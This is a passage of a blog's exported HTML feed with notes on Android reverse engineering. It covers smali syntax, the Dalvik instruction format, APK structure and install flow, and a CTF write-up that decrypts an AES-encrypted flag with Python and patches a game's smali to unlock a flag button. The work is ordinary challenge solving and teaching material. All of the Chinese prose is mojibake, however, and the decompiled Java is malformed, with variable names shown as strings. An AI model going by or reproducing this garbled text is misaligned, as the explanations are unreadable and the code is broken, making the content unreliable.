srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><h2 id="å­—æ®µä¸å‡½æ•°åˆ†æ"><a href="#å­—æ®µä¸å‡½æ•°åˆ†æ" class="headerlink" title="å­—æ®µä¸å‡½æ•°åˆ†æ"></a>å­—æ®µä¸å‡½æ•°åˆ†æ</h2><h3 id="å­—æ®µæ ¼å¼"><a href="#å­—æ®µæ ¼å¼" class="headerlink" title="å­—æ®µæ ¼å¼"></a>å­—æ®µæ ¼å¼</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lpackage/name/ObjectName;-&gt;FieldName:Ljava/lang/String;</span><br></pre></td></tr></table></figure><p>åˆ†æä¸ºjavaï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Lpackage.name</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectName</span></span>&#123;</span><br><span class="line">String FieldName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å‡½æ•°æ ¼å¼"><a href="#å‡½æ•°æ ¼å¼" class="headerlink" title="å‡½æ•°æ ¼å¼"></a>å‡½æ•°æ ¼å¼</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lpackage/name/ObjectName;-&gt;MethodName(III)Z</span><br></pre></td></tr></table></figure><p>åˆ†æä¸ºjavaï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Lpackage.name</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectName</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Boolean <span class="title">MethodName</span><span class="params">(<span class="keyword">int</span> ,<span class="keyword">int</span> ,<span class="keyword">int</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="DalvikæŒ‡ä»¤æ ¼å¼"><a href="#DalvikæŒ‡ä»¤æ ¼å¼" class="headerlink" title="DalvikæŒ‡ä»¤æ ¼å¼"></a>DalvikæŒ‡ä»¤æ ¼å¼</h2><blockquote><p>æ ¼å¼ï¼šåŸºç¡€å­—èŠ‚ç -åç§°åç¼€/å­—èŠ‚ç åç¼€  ç›®çš„å¯„å­˜å™¨  æºå¯„å­˜å™¨</p></blockquote><blockquote><p>expï¼š       move    - wide     /     from16           vAA     ,  vBBBB</p></blockquote><ul><li>å…¶ä¸­moveä¸ºåŸºç¡€å­—èŠ‚ç ï¼Œopcode</li><li>wideä¸ºåç§°åç¼€,æ ‡è¯†æŒ‡ä»¤æ“ä½œçš„æ•°æ®å®½åº¦ä¸º64ä½ã€‚</li><li>from16ä¸ºå­—èŠ‚ç åç¼€,æ ‡è¯†æºä¸ºä¸€ä¸ª16ä½çš„å¯„å­˜å™¨å¼•ç”¨å˜é‡</li><li>vAAä¸ºç›®çš„å¯„å­˜å™¨,å®ƒå§‹ç»ˆåœ¨æºçš„å‰é¢ï¼Œå–å€¼èŒƒå›´ä¸ºv0~v255</li><li>vBBBBä¸ºæºå¯„å­˜å™¨ï¼Œå–å€¼èŒƒå›´ä¸ºv0~v65535</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> AndroidRe </tag>
            
            <tag> Summary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AndroidåŸºç¡€</title>
      <link href="2021/02/12/Android%E5%9F%BA%E7%A1%80/"/>
      <url>2021/02/12/Android%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>è¡¥å……ä¸€äº›å…³äºAndroidçš„ç³»ç»ŸçŸ¥è¯†ã€‚<span id="more"></span></p><h2 id="APKåŒ…ç»“æ„"><a href="#APKåŒ…ç»“æ„" class="headerlink" title="APKåŒ…ç»“æ„"></a>APKåŒ…ç»“æ„</h2><table><thead><tr><th>Filename</th><th>Property</th></tr></thead><tbody><tr><td>assets</td><td>é™æ€èµ„æºï¼ˆå›¾ç‰‡ï¼Œé…ç½®æ–‡ä»¶ï¼Œhtml5ç¦»çº¿èµ„æºï¼‰ä»»æ„æ·±åº¦å­ç›®å½•</td></tr><tr><td>res</td><td>ç¨‹åºèµ„æºï¼ˆå›¾ç‰‡ï¼Œå›¾æ ‡ï¼Œå­—ç¬¦ä¸²ï¼‰æ‹¥æœ‰å¯¹åº”èµ„æºidï¼Œå…³è”ä»£ç R.java</td></tr><tr><td>lib</td><td>ä¾èµ–åº“ï¼ˆå½“å‰appç”¨åˆ°çš„soï¼‰</td></tr><tr><td>META-INF</td><td>è¯ä¹¦ç­¾åæ–‡ä»¶</td></tr><tr><td>.dex</td><td>å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆæ–¹æ³•æ•°&gt;2Â¹â¶æ—¶åˆ†åŒ…ï¼‰</td></tr><tr><td>AndroidManifest.xml</td><td>é¡¹ç›®çš„ç³»ç»Ÿæ¸…å•ï¼ˆé…ç½®ã€å››å¤§ç»„ä»¶çš„å£°æ˜ï¼‰</td></tr><tr><td>resources.arsc</td><td>èµ„æºç´¢å¼•è¡¨</td></tr></tbody></table><h2 id="Androidæ‰“åŒ…æµç¨‹"><a href="#Androidæ‰“åŒ…æµç¨‹" class="headerlink" title="Androidæ‰“åŒ…æµç¨‹"></a>Androidæ‰“åŒ…æµç¨‹</h2><p><img src="https://z3.ax1x.com/2021/03/25/6LmyL9.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LmyL9.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:56%;" /><img src="https://z3.ax1x.com/2021/03/25/6LmrM4.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LmrM4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:50%;" /></p><p>1.èµ„æºâ†’æºç </p><p>2.æ¥å£â†’æºç </p><p>3.æºç â†’å­—èŠ‚ç </p><p>4.å­—èŠ‚ç â†’å¯æ‰§è¡Œ</p><p>5.å¯æ‰§è¡Œâ†’apk</p><p>6.apkç­¾å</p><p>7.apkå¯¹é½å‹ç¼©</p><h2 id="APKå®‰è£…æµç¨‹"><a href="#APKå®‰è£…æµç¨‹" class="headerlink" title="APKå®‰è£…æµç¨‹"></a>APKå®‰è£…æµç¨‹</h2><p><img src="https://z3.ax1x.com/2021/03/25/6LmBzF.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LmBzF.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>1.åœ¨/data/appåˆ›å»ºä»¥apkåŒ…åå‘½åçš„æ–‡ä»¶å¤¹ï¼Œå¹¶å°†apkè§£å‹è‡³æ­¤</p><p>2.åœ¨/data/dataåˆ›å»ºä»¥apkåŒ…åå‘½åçš„æ–‡ä»¶å¤¹ï¼Œè§£æAndroidManifest.xmlå¹¶ä¸Šè¿°æ–‡ä»¶å¤¹å†™å…¥åº”ç”¨æ•°æ®</p><p>3.ä¼˜åŒ–dexæ–‡ä»¶ï¼Œä¿å­˜äºâ€/data/dalvik-cache/profiles/â€œ+apkåŒ…å</p><h2 id="è™šæ‹Ÿæœº"><a href="#è™šæ‹Ÿæœº" class="headerlink" title="è™šæ‹Ÿæœº"></a>è™šæ‹Ÿæœº</h2><table><thead><tr><th>ç±»å‹</th><th>è¿è¡Œ</th><th>æœºåˆ¶</th><th>ç‰¹ç‚¹</th></tr></thead><tbody><tr><td>javaè™šæ‹Ÿæœº</td><td>Javaå­—èŠ‚ç (.class)</td><td>ç•¥</td><td>åŸºäºæ ˆæ¶æ„</td></tr><tr><td>Dalvikè™šæ‹Ÿæœº</td><td>DEXå­—èŠ‚ç ï¼ˆ.odexï¼‰</td><td>jitç¼–è¯‘æœºåˆ¶</td><td>åŸºäºå¯„å­˜å™¨æ¶æ„ï¼ˆâ‰¤Android 5.0ï¼‰</td></tr><tr><td>ARTè™šæ‹Ÿæœº</td><td>DEXå­—èŠ‚ç ï¼ˆ.oatï¼‰</td><td>aotç¼–è¯‘æœºåˆ¶</td><td>åŸºäºå¯„å­˜å™¨æ¶æ„ï¼ˆ&gt;Android 5.0ï¼‰</td></tr></tbody></table><p><img src="https://z3.ax1x.com/2021/03/25/6LmssJ.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LmssJ.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><h2 id="Androidå››å¤§ç»„ä»¶"><a href="#Androidå››å¤§ç»„ä»¶" class="headerlink" title="Androidå››å¤§ç»„ä»¶"></a>Androidå››å¤§ç»„ä»¶</h2><h3 id="å››å¤§ç»„ä»¶"><a href="#å››å¤§ç»„ä»¶" class="headerlink" title="å››å¤§ç»„ä»¶"></a>å››å¤§ç»„ä»¶</h3><table><thead><tr><th>Name</th><th align="center">What for</th></tr></thead><tbody><tr><td>æ´»åŠ¨(Activity)</td><td align="center">è¡¨ç°åŠŸèƒ½ï¼Œå¯è§†åŒ–çš„æŒ‡ä»¤æ“ä½œçª—å£</td></tr><tr><td>æœåŠ¡(Services)</td><td align="center">é•¿æœŸåå°æ‰§è¡Œï¼Œæ— äº¤äº’</td></tr><tr><td>å¹¿æ’­æ¥æ”¶è€…(Broadcast Recive)</td><td align="center">æ¥æ”¶å…¶ä»–åº”ç”¨ç¨‹åºçš„å¹¿æ’­ä¿¡æ¯</td></tr><tr><td>å†…å®¹æä¾›è€…(Content Provider)</td><td align="center">æ•°æ®é›†ï¼Œç”±å¤šä¸ªåº”ç”¨ç¨‹åºå…±äº«ä½¿ç”¨</td></tr></tbody></table><h2 id="Activityç”Ÿå‘½å‘¨æœŸ"><a href="#Activityç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="Activityç”Ÿå‘½å‘¨æœŸ"></a>Activityç”Ÿå‘½å‘¨æœŸ</h2><p><img src="https://z3.ax1x.com/2021/03/25/6Lm0RU.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6Lm0RU.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>]]></content>
      
      
      
        <tags>
            
            <tag> AndroidRe </tag>
            
            <tag> Summary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android Re</title>
      <link href="2020/10/30/Android_Re/"/>
      <url>2020/10/30/Android_Re/</url>
      
        <content type="html"><![CDATA[<p>â€‹        å®‰å“é€†å‘å…¥é—¨å…¥é—¨ã€‚<span id="more"></span>æœ€è¿‘å¯ç®—å¼€å§‹å­¦å®‰å“é€†å‘äº†ï¼Œå…ˆåˆ·åˆ·jarvis ojä¸Šçš„é¢˜åº·åº·ã€‚</p><h2 id="0x00-Smail"><a href="#0x00-Smail" class="headerlink" title="0x00 . Smail"></a>0x00 . Smail</h2><p>â€‹        é¢˜ç›®åªç»™äº†ä¸€ä¸ª.smailæ–‡ä»¶ã€‚smailæ˜¯Davlikè™šæ‹Ÿæœºçš„å¯„å­˜å™¨è¯­è¨€ï¼Œç›¸å½“äºpcå¹³å°çš„æ±‡ç¼–è¯­è¨€ï¼Œå¯ä»¥çœ‹å‡ºä¸ªå¤§æ¦‚é€»è¾‘ã€‚</p><p>â€‹        ä¸è¿‡å½“ç„¶å¯ä»¥å€ŸåŠ©<strong>Smail2java</strong>å·¥å…·ï¼Œå°†å…¶è½¬æ¢æˆ.javaæ–‡ä»¶ã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214537.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214537.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102194054808"></p><p>â€‹        javaå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> net.bluelotus.tomorrow.easyandroid;</span><br><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> java.security.Key;</span><br><span class="line"><span class="keyword">import</span> java.security.GeneralSecurityException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Crackme</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String str2 = <span class="string">&quot;cGhyYWNrICBjdGYgMjAxNg==&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Crackme</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        GetFlag(<span class="string">&quot;sSNnx1UKbYrA1+MOrdtDTA==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">GetFlag</span><span class="params">(String p1)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] <span class="string">&quot;content&quot;</span> = Base64.decode(p1.getBytes(), <span class="number">0x0</span>);</span><br><span class="line">        String <span class="string">&quot;kk&quot;</span> = <span class="keyword">new</span> String(Base64.decode(str2.getBytes(), <span class="number">0x0</span>));</span><br><span class="line">        System.out.println(decrypt(<span class="string">&quot;content&quot;</span>, <span class="string">&quot;kk&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] p1, String p2)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String <span class="string">&quot;m&quot;</span> = <span class="number">0x0</span>;</span><br><span class="line">        <span class="keyword">try</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] <span class="string">&quot;keyStr&quot;</span> = p2.getBytes();</span><br><span class="line">            SecretKeySpec <span class="string">&quot;key&quot;</span> = <span class="keyword">new</span> SecretKeySpec(<span class="string">&quot;keyStr&quot;</span>, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            Cipher <span class="string">&quot;cipher&quot;</span> = Cipher.getInstance(<span class="string">&quot;AES/ECB/NoPadding&quot;</span>);</span><br><span class="line">            <span class="string">&quot;cipher&quot;</span>.init(<span class="number">0x2</span>, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">            <span class="keyword">byte</span>[] <span class="string">&quot;result&quot;</span> = <span class="string">&quot;cipher&quot;</span>.doFinal(p1);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;m&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(NoSuchPaddingException <span class="string">&quot;e&quot;</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;e&quot;</span>.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  <span class="string">&quot;m&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹        ä¸€å¼€å§‹ä¸€ç›´åœ¨çº ç»“Cipher.getInstanceå•¥çš„çœ‹ä¸æ‡‚ï¼Œç„¶åæ‰“ç®—ä¸¢å»eclipseæˆ–è€…Android Studioç›´æ¥è·‘ä½†æ˜¯ç¢°åˆ°ä¸€å †ç¼–è¯‘é—®é¢˜ï¼Œååˆ†å¤´ç–¼ã€‚çœ‹äº†çœ‹è§£æï¼ŒåŸæ¥åªè¦æ˜ç™½æ˜¯AESåŠ å¯†å°±å¯ä»¥äº†ï¼ˆæœç„¶é€†å‘è¿˜æ˜¯å¾—ä¸“æ³¨å…³é”®ä»£ç ï¼‰ï¼Œäºæ˜¯ç”¨pythonè§£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">code = base64.b64decode(<span class="string">&quot;sSNnx1UKbYrA1+MOrdtDTA==&quot;</span>)</span><br><span class="line">key = base64.b64decode(<span class="string">&quot;cGhyYWNrICBjdGYgMjAxNg==&quot;</span>)</span><br><span class="line">aes=AES.new(key,AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span> aes.decrypt(code)</span><br></pre></td></tr></table></figure><h2 id="0x01-çˆ¬æ¥¼æ¢¯"><a href="#0x01-çˆ¬æ¥¼æ¢¯" class="headerlink" title="0x01 . çˆ¬æ¥¼æ¢¯"></a>0x01 . çˆ¬æ¥¼æ¢¯</h2><p>â€‹        å®‰è£…apkå¹¶æ‰“å¼€ï¼Œæ˜¯ä¸€ä¸ªçˆ¬æ¥¼å°æ¸¸æˆï¼Œç‚¹å‡»æŒ‰é’®çˆ¬æ¥¼ï¼Œçˆ¬åˆ°äº†å°±èƒ½çœ‹flagã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214604.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214604.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102194614631"></p><p>â€‹        çœ‹åˆ°è¿™ç¬¬ä¸€æ—¶é—´æƒ³åˆ°äº†å…«é—¨ç¥å™¨ï¼Œç›´æ¥ç»™rootæƒé™ç„¶åä¿®æ”¹å·²çˆ¬æ¥¼å±‚å°±å®Œäº‹ã€‚ä½†æ˜¯è«åå…¶å¦™çš„æ˜¯å…«é—¨ç¥å™¨å¥½åƒä¸é€‚é…æ¨¡æ‹Ÿå™¨çš„å®‰å“ç‰ˆæœ¬ï¼ˆ7.1.2ï¼‰ï¼Œæ¨¡æ‹Ÿå™¨å·²ç»åˆ†é…äº†è¶…çº§ç”¨æˆ·æƒé™ï¼Œä½†æ˜¯æ‰“å¼€å…«é—¨ä¾æ—§æç¤ºæ²¡æœ‰rootæƒé™ã€‚</p><p>â€‹        äºæ˜¯åæ±‡ç¼–apkï¼Œç ”ç©¶ç ”ç©¶é€»è¾‘ã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214620.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214620.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102195434583"></p><p>â€‹        ç¡®å®æ˜¯çˆ¬åˆ°æ¥¼å±‚å³å¯çœ‹flagï¼Œä¸è¿‡æ¥¼å±‚æ•°æ¯æ¬¡æ‰“å¼€éƒ½æ˜¯ä¸ªéšæœºæ•°ï¼Œè¯¥éšæœºæ•°è¦å¯¹32è¿›è¡Œå–ä½™ï¼Œå› æ­¤æœ‰ä¸€å®šæ¦‚ç‡åœ¨æ‰“å¼€åå‘ç°æ¥¼å±‚æ•°ä¸º0ï¼Œå¯ä»¥ç›´æ¥æ‹¿flagã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214646.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214646.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102195634024"></p><p>â€‹        ä¸è¿‡è¿˜æ˜¯é‡‡ç”¨ä¸“ä¸šåŠæ³•ï¼Œç”¨mtç®¡ç†å™¨è§£å‹ï¼ŒDexç¼–è¾‘å™¨æŸ¥çœ‹dexæ–‡ä»¶ã€‚</p><p>â€‹            <img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214653.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214653.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102195859981" style="zoom: 70%;" /><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214706.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214706.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102195859981" style="zoom: 70%;" /></p><p>â€‹        æ¥ç€æ‰¾åˆ°MainActivity()ã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214723.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214723.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102201112453"></p><p>â€‹        å‘ç°ç¬¬ä¸€è¡Œå¤„v5è¢«åˆå§‹åŒ–ä¸º0ï¼Œ8-9è¡Œå¤„ç”¨v5åˆå§‹åŒ–v0ï¼Œç„¶åå°†v0çš„å€¼ç”¨ä½œå‚æ•°è°ƒç”¨flagç»„ä»¶çš„ setClickable()å‡½æ•°ã€‚ä¹Ÿå°±æ˜¯è¯´å°†v5åˆå§‹åŒ–å€¼æ”¹ä¸º1å³å¯ä½¿å¾—flagç»„ä»¶ä¸€ç›´å¤„äºclickableã€‚</p><p>â€‹        æ”¹äº†ä¹‹ååœ¨å³ä¸Šè§’ç‚¹å‡»ä¿å­˜ï¼Œé€€å‡ºå†ä¿å­˜ä¸€æ¬¡ï¼Œç„¶åä¸€è·¯é€€å‡ºã€‚</p><p>â€‹                                  <img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214759.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214759.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102201750895"><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214806.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214806.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201102201815452"></p><p>â€‹        ç„¶åå…¨é€‰(å·¦å³åˆ’åŠ¨é€‰æ‹©)ï¼Œé•¿æŒ‰å‹ç¼©ï¼Œé€‰æ‹©apkæ¨¡å¼ã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214831.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20201102214831.png" 